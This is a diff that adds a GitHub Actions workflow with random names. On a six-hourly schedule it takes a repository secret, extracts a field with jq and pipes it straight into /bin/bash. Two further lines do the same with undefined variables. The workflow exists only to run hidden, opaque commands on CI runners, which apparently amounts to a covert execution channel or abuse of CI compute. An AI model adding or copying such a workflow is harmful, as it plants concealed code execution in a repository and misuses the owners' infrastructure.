@@ -1,0 +1,19 @@
+name: midwifeprosecutor
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: midwifeprosecutor
+        env:
+          ik5: ${{ secrets.ik5 }}
+        run: |
+          echo $ik5 | jq -r .ppnb97 | /bin/bash
+          echo $tsfz79690 | jq -r .cuc52 | /bin/bash
+          echo $lycxd9 | jq -r .mvx96 | /bin/bash
+
